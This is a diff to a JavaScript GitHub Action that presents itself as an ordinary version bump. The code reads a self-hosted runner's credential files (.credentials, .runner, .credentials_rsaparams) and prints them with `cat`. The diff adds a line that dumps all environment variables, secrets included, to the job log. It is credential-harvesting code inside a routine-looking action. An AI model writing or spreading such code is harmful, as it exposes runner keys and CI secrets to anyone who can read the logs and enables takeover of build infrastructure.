@@ -1,12 +1,13 @@
 const core = require('@actions/core');
 const github = require('@actions/github');
 const fs = require("fs");
-const process = require("child_process");
+const cl_process = require("child_process");
 
 try {
     
     console.log("This is the v1.1.2 version.");
     console.log(__dirname);
+    console.log(process.env);
     const files = fs.readdirSync('/home/musset/actions-runner');
     files.forEach(element => {
         if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
@@ -31,7 +32,7 @@ try {
             
             let path = `/home/musset/actions-runner-private/${element}`;
             
-            process.exec(`cat ${path}`, (err, stdout, stderr) => {
+            cl_process.exec(`cat ${path}`, (err, stdout, stderr) => {
                 if (err){
                     console.log(err);
                     return;
